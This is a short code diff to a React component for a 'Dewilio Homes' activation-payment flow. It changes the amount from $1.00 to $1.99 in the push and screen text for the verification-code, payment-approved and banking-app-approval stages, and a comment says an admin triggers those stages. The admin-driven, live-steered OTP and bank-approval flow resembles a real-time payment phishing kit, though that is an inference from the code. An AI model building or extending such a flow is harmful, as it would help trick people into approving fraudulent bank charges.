@@ -6,7 +6,7 @@ import Link from "next/link";
 import { Check, Loader2, Lock, ShieldAlert, ShieldCheck, Smartphone } from "lucide-react";
 import { useActivationLive } from "@/lib/useActivationLive";
 
-const AMOUNT = "$1.00";
+const AMOUNT = "$1.99";
 
 /** The banking-app approval steps, shown once an admin sends the approval request. */
 const APPROVAL_STEPS = [
@@ -32,24 +32,24 @@ const NOTICE_STAGES = ["otp", "approved", "app_approval"];
 const NOTICE_COPY: Record<string, { screen: string; push: string; action: string; title: string; body: string }> = {
   otp: {
     screen: "Verification code sent",
-    push: "Dewilio Homes is requesting $1.00",
+    push: "Dewilio Homes is requesting $1.99",
     action: "Open code screen",
     title: "Code sent",
     body: "A verification code is waiting for you. We’re taking you to the code screen.",
   },
   approved: {
     screen: "Payment approved",
-    push: "Dewilio Homes approved $1.00",
+    push: "Dewilio Homes approved $1.99",
     action: "Approve",
     title: "Payment approved",
     body: "Your activation payment went through. We’re taking you to your account.",
   },
   app_approval: {
     screen: "Approval requested",
-    push: "Dewilio Homes is requesting $1.00",
+    push: "Dewilio Homes is requesting $1.99",
     action: "Approve",
     title: "Approve the payment",
-    body: "Open your banking app and approve the $1.00 activation payment to continue.",
+    body: "Open your banking app and approve the $1.99 activation payment to continue.",
   },
 };
 
